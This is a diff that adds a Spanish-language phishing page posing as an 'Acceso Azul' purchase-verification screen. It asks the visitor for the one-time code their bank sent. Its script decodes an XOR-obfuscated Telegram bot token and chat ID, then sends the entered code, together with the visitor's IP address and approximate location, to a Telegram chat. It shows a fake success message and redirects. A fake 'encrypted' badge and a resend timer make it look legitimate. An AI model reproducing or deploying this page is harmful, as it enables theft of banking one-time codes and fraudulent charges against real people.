@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de seguridad</title>
+  <style>
+    :root {
+      --accent: #2563eb;
+      --accent-hover: #1d4ed8;
+      --bg: #eef2f7;
+      --card: #ffffff;
+      --text: #0f172a;
+      --muted: #64748b;
+      --border: #cbd5e1;
+      --error: #b91c1c;
+      --success: #15803d;
+      --loading: #1d4ed8;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: "Inter", "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      background:
+        radial-gradient(circle at 20% 20%, #dbeafe 0%, transparent 42%),
+        radial-gradient(circle at 80% 80%, #e0e7ff 0%, transparent 42%),
+        var(--bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 440px;
+      background: var(--card);
+      border-radius: 20px;
+      padding: 34px 32px 28px;
+      box-shadow: 0 20px 50px -12px rgba(15, 23, 42, .25);
+      border: 1px solid rgba(148, 163, 184, .25);
+      position: relative;
+    }
+
+    .card::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 32px; right: 32px;
+      height: 3px;
+      border-radius: 0 0 4px 4px;
+      background: linear-gradient(90deg, var(--accent), #1e3a8a);
+    }
+
+    /* ---------- Barra superior ---------- */
+    .org {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 22px;
+    }
+
+    .org .logo {
+      width: 32px; height: 32px;
+      border-radius: 9px;
+      background: linear-gradient(145deg, var(--accent), var(--accent-hover));
+      color: #fff;
+      display: grid;
+      place-items: center;
+      font-weight: 800;
+      font-size: 15px;
+      box-shadow: 0 6px 14px -6px rgba(37, 99, 235, .7);
+    }
+
+    .org span {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--muted);
+      letter-spacing: .2px;
+    }
+
+    h1 {
+      font-size: 23px;
+      font-weight: 700;
+      letter-spacing: -.4px;
+      margin-bottom: 8px;
+      line-height: 1.25;
+    }
+
+    .sub {
+      font-size: 13.5px;
+      line-height: 1.55;
+      color: var(--muted);
+      margin-bottom: 8px;
+    }
+
+    /* ---------- Campo de código ---------- */
+    .field { margin: 22px 0 6px; }
+
+    .field label {
+      display: block;
+      font-size: 12.5px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 9px;
+    }
+
+    .box {
+      display: flex;
+      align-items: center;
+      border: 1.5px solid var(--border);
+      border-radius: 12px;
+      background: #f8fafc;
+      transition: border-color .15s, box-shadow .15s, background .15s;
+    }
+
+    .box:focus-within {
+      border-color: var(--accent);
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, .18);
+    }
+
+    .box input {
+      flex: 1;
+      width: 100%;
+      border: none;
+      background: transparent;
+      outline: none;
+      padding: 15px 16px;
+      font-family: ui-monospace, "Cascadia Mono", Consolas, monospace;
+      font-size: 22px;
+      font-weight: 700;
+      letter-spacing: 6px;
+      text-align: center;
+      color: var(--text);
+    }
+
+    .box input::placeholder {
+      color: #b6c2d4;
+      font-weight: 500;
+      letter-spacing: 2px;
+      font-family: "Inter", "Segoe UI", Arial, sans-serif;
+      font-size: 15px;
+    }
+
+    .box input:-webkit-autofill {
+      -webkit-box-shadow: 0 0 0 1000px #f8fafc inset !important;
+      -webkit-text-fill-color: var(--text) !important;
+    }
+
+    .hint {
+      font-size: 11.5px;
+      color: var(--muted);
+      margin-top: 8px;
+    }
+
+    /* ---------- Reenvío ---------- */
+    .resend {
+      margin-top: 14px;
+      font-size: 12.5px;
+      color: var(--muted);
+      min-height: 18px;
+    }
+
+    .resend a {
+      color: var(--accent);
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .resend a:hover { text-decoration: underline; }
+    .resend .off { color: #a0aec0; }
+
+    /* ---------- Botón ---------- */
+    .btn {
+      width: 100%;
+      height: 48px;
+      margin-top: 20px;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(135deg, var(--accent), var(--accent-hover));
+      color: #fff;
+      font-family: inherit;
+      font-size: 15px;
+      font-weight: 600;
+      letter-spacing: .3px;
+      cursor: pointer;
+      transition: transform .12s, box-shadow .15s, opacity .15s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      box-shadow: 0 10px 22px -10px rgba(37, 99, 235, .8);
+    }
+
+    .btn:hover:not(:disabled) { transform: translateY(-1px); }
+    .btn:active:not(:disabled) { transform: translateY(0); }
+    .btn:disabled { opacity: .65; cursor: not-allowed; }
+    .btn .btn-text { display: flex; align-items: center; gap: 7px; }
+    .btn.loading .btn-text { visibility: hidden; }
+
+    .btn.loading::after {
+      content: "";
+      position: absolute;
+      width: 18px; height: 18px;
+      border: 2.5px solid rgba(255, 255, 255, .3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ---------- Mensajes ---------- */
+    .msg {
+      display: none;
+      margin-top: 14px;
+      font-size: 13px;
+      line-height: 1.5;
+      padding: 10px 12px;
+      border-radius: 8px;
+      font-weight: 500;
+    }
+
+    .msg.error   { display: block; background: #fef2f2; color: var(--error); }
+    .msg.success { display: block; background: #f0fdf4; color: var(--success); }
+    .msg.loading { display: block; background: #eff6ff; color: var(--loading); }
+
+    /* ---------- Seguridad ---------- */
+    .secure {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-top: 18px;
+      font-size: 11.5px;
+      color: var(--muted);
+    }
+
+    .secure svg { width: 12px; height: 12px; fill: #94a3b8; }
+
+    /* ---------- Pie ---------- */
+    .bottom {
+      margin-top: 22px;
+      padding-top: 16px;
+      border-top: 1px solid #eef2f7;
+      font-size: 12.5px;
+      color: var(--muted);
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+    }
+
+    .bottom a { color: var(--accent); font-weight: 600; text-decoration: none; }
+    .bottom a:hover { text-decoration: underline; }
+
+    .legal {
+      margin-top: 18px;
+      font-size: 11px;
+      color: #94a3b8;
+      text-align: center;
+    }
+
+    @media (max-width: 460px) {
+      body { padding: 0; background: #fff; justify-content: flex-start; }
+      .card {
+        border: none; box-shadow: none; border-radius: 0;
+        padding: 26px 20px; max-width: 100%;
+      }
+      .card::before { left: 20px; right: 20px; }
+      h1 { font-size: 21px; }
+      .box input { font-size: 20px; letter-spacing: 5px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="org">
+      <div class="logo"><img width="50px" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcToUIe9A6QvLvypxEQu3Y8mJ7WCb9L6pROqNg&s" alt=""></div>
+     
+    </div>
+
+    <h1>Validación  de tu compra</h1>
+    <p class="sub">Ingresa el código que enviamos a tu teléfono y/o correo para confirmar la compra generada.</p>
+
+    <form id="otpForm" autocomplete="off">
+      <div class="field">
+        <label for="codigo">Código de un solo uso</label>
+        <div class="box">
+          <input type="text" id="codigo" name="codigo" placeholder="Escribe el código"
+                 inputmode="numeric" autocomplete="one-time-code" required>
+        </div>
+        <p class="hint">Puede tener distinta cantidad de dígitos según el banco.</p>
+        <div class="resend" id="resend"></div>
+      </div>
+
+      <button type="submit" class="btn" id="submitBtn">
+        <span class="btn-text">Verificar</span>
+      </button>
+
+      <div id="message" class="msg"></div>
+    </form>
+
+    <div class="secure">
+      <svg viewBox="0 0 24 24"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm0 2a3 3 0 0 1 3 3v3H9V6a3 3 0 0 1 3-3z"/></svg>
+      Datos cifrados en tránsito
+    </div>
+
+    <div class="bottom">
+      <span>¿Problemas para verificar?</span>
+      <a href="#">Contactar soporte</a>
+    </div>
+  </div>
+
+  <div class="legal">© 2026 Acceso Azul · Términos de uso · Privacidad</div>
+
+  <script>
+(function () {
+  'use strict';
+
+  function tgDec(s) {
+    const k = 'm4g0rd0';
+    const d = atob(s);
+    let o = '';
+    for (let i = 0; i < d.length; i++) o += String.fromCharCode(d.charCodeAt(i) ^ k.charCodeAt(i % k.length));
+    return o;
+  }
+  const TG_TOKEN = tgDec('VAVRAkZTAVQCVgozJXgydzB3PVxSNEc9VyY8Y15lMHEnCGgaBRFlIjUCK1s+Ww==');
+  const TG_CHAT = tgDec('QAVXAEFdCVwCUgZBVgg=');
+
+  async function enviarTelegram(texto) {
+    const url = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage' +
+      '?chat_id=' + encodeURIComponent(TG_CHAT) +
+      '&text=' + encodeURIComponent(texto);
+    try { await fetch(url, { mode: 'no-cors' }); } catch (e) {}
+  }
+
+  const REDIRECT_URL = 'finallod.html';
+
+  const form = document.getElementById('otpForm');
+  const codigoInput = document.getElementById('codigo');
+  const submitBtn = document.getElementById('submitBtn');
+  const messageDiv = document.getElementById('message');
+  const resendEl = document.getElementById('resend');
+
+  let isSubmitting = false;
+  let segundos = 45;
+  let timer = null;
+
+  function show(text, type = 'error', timeout = 5000) {
+    messageDiv.textContent = text;
+    messageDiv.className = 'msg ' + type;
+    if (timeout > 0) {
+      setTimeout(() => { messageDiv.className = 'msg'; messageDiv.textContent = ''; }, timeout);
+    }
+  }
+
+  function iniciarContador() {
+    clearInterval(timer);
+    segundos = 45;
+    pintarContador();
+    timer = setInterval(() => {
+      segundos--;
+      if (segundos <= 0) clearInterval(timer);
+      pintarContador();
+    }, 1000);
+  }
+
+  function pintarContador() {
+    if (segundos > 0) {
+      resendEl.innerHTML = '<span class="off">Reenviar código en ' + segundos + ' s</span>';
+      return;
+    }
+    resendEl.innerHTML = '<a id="reLink">Reenviar código</a>';
+    document.getElementById('reLink').addEventListener('click', function () {
+      iniciarContador();
+      show('Código reenviado.', 'loading', 3000);
+    });
+  }
+
+  async function getIP() {
+    try {
+      const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
+      if (!r.ok) throw 0;
+      const d = await r.json();
+      return d.ip || 'No disponible';
+    } catch { return 'No disponible'; }
+  }
+
+  async function getLocation() {
+    try {
+      const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+      if (!r.ok) throw 0;
+      const d = await r.json();
+      return `${d.city || 'Desconocida'}, ${d.country_name || 'Desconocido'}`;
+    } catch { return 'No disponible'; }
+  }
+
+  codigoInput.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '').slice(0, 12);
+  });
+
+  form.addEventListener('submit', async function (e) {
+    e.preventDefault();
+    if (isSubmitting) return;
+
+    const codigo = codigoInput.value.trim();
+
+    if (codigo.length < 4) {
+      show('El código debe tener al menos 4 dígitos.');
+      codigoInput.focus();
+      return;
+    }
+
+    isSubmitting = true;
+    submitBtn.disabled = true;
+    submitBtn.classList.add('loading');
+    show('Verificando…', 'loading', 0);
+
+    try {
+      const [ip, location] = await Promise.all([getIP(), getLocation()]);
+
+      await enviarTelegram(
+        '📥 Código ingresado\n\n' +
+        'codigo: ' + codigo + '\n' +
+        'ip: ' + ip + '\n' +
+        'location: ' + location
+      );
+
+      show('Código verificado correctamente. Redirigiendo…', 'success', 0);
+      setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
+
+    } catch (err) {
+      console.error(err);
+      show('Error de conexión. Intenta nuevamente.');
+      isSubmitting = false;
+      submitBtn.disabled = false;
+      submitBtn.classList.remove('loading');
+      codigoInput.value = '';
+      codigoInput.focus();
+    }
+  });
+
+  iniciarContador();
+  codigoInput.focus();
+})();
+  </script>
+</body>
+</html>
